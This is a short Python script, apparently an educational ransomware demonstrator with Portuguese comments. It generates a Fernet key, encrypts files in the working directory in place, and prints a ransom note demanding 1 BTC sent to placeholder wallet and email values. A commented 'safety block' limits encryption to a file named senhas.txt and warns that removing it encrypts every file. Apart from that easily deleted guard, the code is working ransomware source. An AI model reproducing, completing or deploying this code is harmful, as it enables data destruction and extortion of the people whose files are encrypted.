#!/usr/bin/env python3

from cryptography.fernet import Fernet
import os


def write_key():
    key = Fernet.generate_key()
    with open("key.txt", "wb") as key_file:
        key_file.write(key)


def encrypt_file(file_name, key):
    fernet = Fernet(key)
    with open(file_name, 'rb') as file:
        original = file.read()
    encrypted = fernet.encrypt(original)
    with open(file_name, 'wb') as encrypted_file:
        encrypted_file.write(encrypted)


if __name__ == "__main__":
    write_key()
    for files in os.listdir():
        if files.lower() in ["key.txt", "requirements.txt"] or files.lower().endswith((".py", ".exe")) or os.path.isdir(files):
            continue
        ### BLOCO DE SEGURANÇA ###
        # Utilizar em ambiente controlado apenas para testes. Risco de perda de dados!!!
        elif files.lower() not in ["senhas.txt"]:
            continue
        # CUIDADO: Caso este bloco seja removido, o script irá criptografar todos os arquivos no diretório!
        ### FIM DO BLOCO DE SEGURANÇA ###
        print(f"Encrypting {files}...")
        with open("key.txt", "rb") as key_file:
            key = key_file.read()
            encrypt_file(files, key)
    print("Seus arquivos foram criptografados! Para recuperá-los, envie um 1 BTC para CHAVE_BTC e envie um email para EMAIL@DOMINIO.COM com o comprovante de pagamento.")
